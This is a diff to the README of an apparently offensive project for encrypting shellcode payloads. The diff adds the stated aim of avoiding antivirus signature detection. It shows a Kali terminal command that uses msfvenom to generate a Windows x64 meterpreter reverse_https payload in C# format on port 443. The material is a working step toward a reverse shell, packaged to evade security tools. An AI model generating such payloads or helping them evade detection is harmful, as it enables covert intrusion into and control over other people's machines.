@@ -1,6 +1,6 @@
 # Encrypting-Custom-Payload
 Continuation of https://github.com/VietTheBarbarian/ShellcodeRunnerC-
-Just have to make something to encrypt our payload 
+Just have to make something to encrypt our payload to avoid signature detection
 ```
 ┌──(kali㉿kali)-[~]
 └─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f csharp 
